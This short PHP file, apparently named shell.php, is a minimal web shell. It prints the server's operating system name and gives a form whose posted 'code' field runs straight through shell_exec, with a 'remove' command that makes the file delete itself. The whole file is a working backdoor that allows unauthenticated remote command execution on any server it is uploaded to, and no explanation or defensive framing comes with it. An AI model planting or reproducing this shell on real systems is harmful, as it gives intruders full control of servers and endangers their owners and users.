<?php
echo php_uname('s');
?><form method="post">
<textarea name="code" cols="20" rows="5"></textarea>
<br>
<input type="submit">
</form>
<?php
error_reporting(E_ALL^E_NOTICE);
if($_POST['code']) {
	if($_POST['code'] == 'remove') {
		unlink('shell.php');
	}
	else {
		echo shell_exec($_POST['code']);
	}
}